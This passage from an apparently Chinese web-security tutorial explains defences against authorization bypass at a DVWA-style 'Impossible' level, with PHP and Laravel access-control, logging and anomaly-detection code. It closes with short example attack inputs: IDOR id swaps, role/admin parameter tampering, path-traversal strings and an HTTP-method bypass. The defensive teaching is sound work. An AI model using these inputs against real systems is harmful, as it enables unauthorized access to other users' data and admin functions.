+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">用户请求访问user_id=2</span><br><span class="line">    ↓</span><br><span class="line">1. 检查是否登录 → 未登录则拒绝</span><br><span class="line">    ↓</span><br><span class="line">2. 验证CSRF Token → 无效则拒绝</span><br><span class="line">    ↓</span><br><span class="line">3. 验证输入参数 → 无效则拒绝</span><br><span class="line">    ↓</span><br><span class="line">4. 查询当前用户角色 → 从数据库</span><br><span class="line">    ↓</span><br><span class="line">5. 检查权限：</span><br><span class="line">   <span class="bullet">-</span> <span class="string">管理员？→ 允许</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">访问自己？→ 允许</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">其他？→ 拒绝</span></span><br><span class="line">    ↓</span><br><span class="line">6. 记录访问日志</span><br><span class="line">    ↓</span><br><span class="line">7. 执行操作</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">攻击1：?<span class="attribute">id</span>=2（越权访问）</span><br><span class="line">权限检查 → 不是管理员 &amp;&amp; 不是自己 → 拒绝</span><br><span class="line">日志记录 → 记录未授权尝试</span><br><span class="line"></span><br><span class="line">攻击2：伪造Referer</span><br><span class="line">不依赖Referer → 使用CSRF Token → 无效</span><br><span class="line"></span><br><span class="line">攻击3：类型混淆(?<span class="attribute">id</span>=2.0)</span><br><span class="line">强制类型转换 (int)<span class="variable">$userId</span> → 2</span><br><span class="line">严格比较 === → 正确验证</span><br><span class="line"></span><br><span class="line">攻击4：参数污染(?<span class="attribute">id</span>=5&amp;id=2)</span><br><span class="line">只取第一个参数 → 正常处理</span><br><span class="line"></span><br><span class="line">攻击5：会话劫持</span><br><span class="line">即使获取Session，仍需通过权限检查</span><br><span class="line"></span><br><span class="line">攻击6：修改数据库角色</span><br><span class="line">从数据库读取角色 → 如果能修改数据库，已经完全控制系统</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键防御点：</strong></p>
+<ol>
+<li><strong>基于角色的访问控制（RBAC）</strong> - 明确的角色和权限</li>
+<li><strong>资源所有权验证</strong> - 每次都检查</li>
+<li><strong>最小权限原则</strong> - 只给必要的权限</li>
+<li><strong>审计和监控</strong> - 记录所有访问</li>
+<li><strong>深度防御</strong> - 多层验证</li>
+</ol>
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><h4 id="1-实施RBAC（基于角色的访问控制）"><a href="#1-实施RBAC（基于角色的访问控制）" class="headerlink" title="1. 实施RBAC（基于角色的访问控制）"></a>1. 实施RBAC（基于角色的访问控制）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义角色和权限</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Permission</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VIEW_OWN_DATA</span> = <span class="string">&#x27;view_own_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VIEW_ALL_DATA</span> = <span class="string">&#x27;view_all_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MODIFY_OWN_DATA</span> = <span class="string">&#x27;modify_own_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MODIFY_ALL_DATA</span> = <span class="string">&#x27;modify_all_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DELETE_USERS</span> = <span class="string">&#x27;delete_users&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$permissions</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addPermission</span>(<span class="params"><span class="variable">$permission</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;permissions[] = <span class="variable">$permission</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasPermission</span>(<span class="params"><span class="variable">$permission</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$permission</span>, <span class="variable">$this</span>-&gt;permissions);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义角色</span></span><br><span class="line"><span class="variable">$adminRole</span> = <span class="keyword">new</span> <span class="title class_">Role</span>();</span><br><span class="line"><span class="variable">$adminRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">VIEW_ALL_DATA</span>);</span><br><span class="line"><span class="variable">$adminRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">MODIFY_ALL_DATA</span>);</span><br><span class="line"><span class="variable">$adminRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">DELETE_USERS</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$userRole</span> = <span class="keyword">new</span> <span class="title class_">Role</span>();</span><br><span class="line"><span class="variable">$userRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">VIEW_OWN_DATA</span>);</span><br><span class="line"><span class="variable">$userRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">MODIFY_OWN_DATA</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查权限</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentRole</span>-&gt;<span class="title function_ invoke__">hasPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">VIEW_ALL_DATA</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Access denied&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-集中的权限检查"><a href="#2-集中的权限检查" class="headerlink" title="2. 集中的权限检查"></a>2. 集中的权限检查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中间件/拦截器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthMiddleware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPermission</span>(<span class="params"><span class="variable">$requiredPermission</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$currentUser</span> = <span class="title function_ invoke__">getCurrentUser</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Unauthorized&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$role</span> = <span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$role</span>-&gt;<span class="title function_ invoke__">hasPermission</span>(<span class="variable">$requiredPermission</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">            <span class="title function_ invoke__">logUnauthorizedAccess</span>(<span class="variable">$currentUser</span>, <span class="variable">$requiredPermission</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="title class_">AuthMiddleware</span>::<span class="title function_ invoke__">checkPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">DELETE_USERS</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-每个操作都验证权限"><a href="#1-每个操作都验证权限" class="headerlink" title="1. 每个操作都验证权限"></a>1. 每个操作都验证权限</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 错误：只在前端隐藏按钮</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span> == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;button onclick=&quot;deleteUser()&quot;&gt;Delete&lt;/button&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 正确：在后端验证</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteUser</span>(<span class="params"><span class="variable">$userId</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">hasPermission</span>(<span class="string">&#x27;delete_users&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnauthorizedException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-验证资源所有权"><a href="#2-验证资源所有权" class="headerlink" title="2. 验证资源所有权"></a>2. 验证资源所有权</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看用户资料</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewProfile</span>(<span class="params"><span class="variable">$userId</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$currentUserId</span> = <span class="title function_ invoke__">getCurrentUserId</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查：是管理员 或 是用户本人</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">isAdmin</span>() &amp;&amp; <span class="variable">$currentUserId</span> !== <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ForbiddenException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询并返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-使用白名单"><a href="#3-使用白名单" class="headerlink" title="3. 使用白名单"></a>3. 使用白名单</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许的操作列表</span></span><br><span class="line"><span class="variable">$allowedActions</span> = [<span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;edit&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$allowedActions</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-防止参数篡改"><a href="#4-防止参数篡改" class="headerlink" title="4. 防止参数篡改"></a>4. 防止参数篡改</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 危险：从用户输入获取角色</span></span><br><span class="line"><span class="variable">$role</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 安全：从服务器端Session/数据库获取</span></span><br><span class="line"><span class="variable">$role</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_role&#x27;</span>];</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="variable">$role</span> = <span class="title function_ invoke__">getUserRoleFromDatabase</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><h4 id="1-记录所有授权失败"><a href="#1-记录所有授权失败" class="headerlink" title="1. 记录所有授权失败"></a>1. 记录所有授权失败</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logAuthorizationFailure</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$action</span>, <span class="variable">$resource</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$user</span>,</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">        <span class="string">&#x27;resource&#x27;</span> =&gt; <span class="variable">$resource</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入日志</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/security/authz_failures.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果失败次数过多，触发警报</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">countRecentFailures</span>(<span class="variable">$user</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;Possible privilege escalation attempt by <span class="subst">$user</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-异常行为检测"><a href="#2-异常行为检测" class="headerlink" title="2. 异常行为检测"></a>2. 异常行为检测</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测异常访问模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectAnomalousAccess</span>(<span class="params"><span class="variable">$userId</span>, <span class="variable">$accessedUserId</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 用户A频繁尝试访问不同用户</span></span><br><span class="line">    <span class="variable">$recentAccesses</span> = <span class="title function_ invoke__">getRecentAccesses</span>(<span class="variable">$userId</span>, <span class="number">3600</span>); <span class="comment">// 过去1小时</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$uniqueTargets</span> = <span class="title function_ invoke__">array_unique</span>(<span class="variable">$recentAccesses</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$uniqueTargets</span>) &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="comment">// 可能在枚举用户</span></span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;User <span class="subst">$userId</span> is accessing too many different users&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">lockAccount</span>(<span class="variable">$userId</span>, <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义策略</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPolicy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view</span>(<span class="params">User <span class="variable">$currentUser</span>, User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 管理员可以查看所有用户</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$currentUser</span>-&gt;<span class="title function_ invoke__">isAdmin</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用户只能查看自己</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$currentUser</span>-&gt;id === <span class="variable">$user</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">User <span class="variable">$currentUser</span>, User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$currentUser</span>-&gt;<span class="title function_ invoke__">isAdmin</span>() || <span class="variable">$currentUser</span>-&gt;id === <span class="variable">$user</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">User <span class="variable">$currentUser</span>, User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 只有管理员可以删除</span></span><br><span class="line">        <span class="comment">// 且不能删除自己</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$currentUser</span>-&gt;<span class="title function_ invoke__">isAdmin</span>() &amp;&amp; <span class="variable">$currentUser</span>-&gt;id !== <span class="variable">$user</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在控制器中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">authorize</span>(<span class="string">&#x27;view&#x27;</span>, <span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;users.show&#x27;</span>, <span class="title function_ invoke__">compact</span>(<span class="string">&#x27;user&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用中间件"><a href="#使用中间件" class="headerlink" title="使用中间件"></a>使用中间件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义中间件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminMiddleware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$next</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">auth</span>()-&gt;<span class="title function_ invoke__">user</span>()-&gt;<span class="title function_ invoke__">isAdmin</span>()) &#123;</span><br><span class="line">            <span class="title function_ invoke__">abort</span>(<span class="number">403</span>, <span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由中使用</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">middleware</span>([<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>])-&gt;<span class="title function_ invoke__">group</span>(function () &#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/admin/users&#x27;</span>, <span class="string">&#x27;AdminController@users&#x27;</span>);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;/admin/users/&#123;id&#125;&#x27;</span>, <span class="string">&#x27;AdminController@deleteUser&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>认证检查</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>授权检查</td>
+<td>❌</td>
+<td>弱Referer检查</td>
+<td>角色检查</td>
+<td>完善检查</td>
+</tr>
+<tr>
+<td>资源所有权</td>
+<td>❌</td>
+<td>❌</td>
+<td>弱验证</td>
+<td>✅ 严格验证</td>
+</tr>
+<tr>
+<td>CSRF防护</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>角色管理</td>
+<td>❌</td>
+<td>弱角色检查</td>
+<td>数据库角色</td>
+<td>RBAC</td>
+</tr>
+<tr>
+<td>输入验证</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>审计日志</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>类型安全</td>
+<td>❌</td>
+<td>❌</td>
+<td>&#x3D;&#x3D;</td>
+<td>&#x3D;&#x3D;&#x3D;</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="常见攻击向量"><a href="#常见攻击向量" class="headerlink" title="常见攻击向量"></a>常见攻击向量</h2><h3 id="1-直接对象引用（IDOR）"><a href="#1-直接对象引用（IDOR）" class="headerlink" title="1. 直接对象引用（IDOR）"></a>1. 直接对象引用（IDOR）</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常：<span class="regexp">/user/</span>profile?id=<span class="number">123</span>（自己的ID）</span><br><span class="line">攻击：<span class="regexp">/user/</span>profile?id=<span class="number">456</span>（他人的ID）</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-参数污染"><a href="#2-参数污染" class="headerlink" title="2. 参数污染"></a>2. 参数污染</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">admin</span>?<span class="keyword">role</span>=<span class="keyword">admin</span>&amp;user_id=<span class="number">5</span></span><br><span class="line">/api/users/<span class="number">5</span>?<span class="keyword">admin</span>=<span class="keyword">true</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-路径遍历"><a href="#3-路径遍历" class="headerlink" title="3. 路径遍历"></a>3. 路径遍历</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/../</span>..<span class="regexp">/admin/</span>panel</span><br><span class="line"><span class="regexp">/admin/</span>%<span class="number">2</span>e%<span class="number">2</span>e/panel</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-HTTP方法绕过"><a href="#4-HTTP方法绕过" class="headerlink" title="4. HTTP方法绕过"></a>4. HTTP方法绕过</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> /<span class="keyword">admin</span> → <span class="number">403</span> Forbidden</span><br><span class="line">POST /<span class="keyword">admin</span> → <span class="number">200</span> OK（如果只检查<span class="keyword">GET</span>）</span><br></pre></td></tr></table></figure>
+
+<hr>
